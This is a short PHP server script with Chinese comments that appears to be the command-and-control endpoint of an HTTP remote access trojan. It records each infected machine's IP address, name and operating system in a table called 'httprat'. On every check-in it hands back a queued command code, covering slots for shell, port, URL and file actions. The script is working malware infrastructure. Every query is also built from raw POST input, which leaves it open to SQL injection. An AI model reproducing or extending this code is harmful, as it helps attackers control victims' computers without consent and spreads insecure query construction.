<?php
require("config.php");

$mysqli = new mysqli($dbaddr,$username,$password,$dbname);
if(mysqli_connect_error())
{
	printf("数据库连接失败：%s\n",mysqli_connect_error());
	exit();
}
$ver=$_POST["ver"];
if($ver==NULL)die("ERROR!");
$id=$_POST["id"];
$name = $_POST["name"];
$ip = $_POST["ip"];
$system=$_POST["system"];


$time = date("Y-n-j H:i:s");			//当前时间
				
//初始命令为什么都不做	
if($id==NULL)
{
	$cmd = 1; 	
	$shell="donothing";
	$ports="donothing";
	$url="donothing";
	$filename="donothing";
	$mysqli->query("INSERT INTO httprat(IP,cmd,lasttime,name,shell,ports,url,filename,ver,system)VALUES('$ip','$cmd','$time','$name','$shell','$ports','$url','$filename','$ver','$system')");
	if($result = $mysqli->query("SELECT id FROM httprat where name ='$name'"))
	{
		$row = $result->fetch_assoc();
		$idout=$row["id"];
		$mysqli->query("INSERT INTO status(id,shellLT,tranLT)VALUES('$idout','$time','$time')");
		printf("%s%03d%03d","REP",$row["id"],1);
	}
}
else
{
	$result = $mysqli->query("SELECT cmd FROM httprat where id ='$id'");
	$row = $result->fetch_assoc();
	printf("%s%03d%03d","REP",$id,$row[cmd]);

	$mysqli->query("UPDATE httprat SET cmd=1 where id='$id'");
	$mysqli->query("UPDATE httprat SET lasttime='$time' where id='$id'");
}
	$mysqli->close();
?>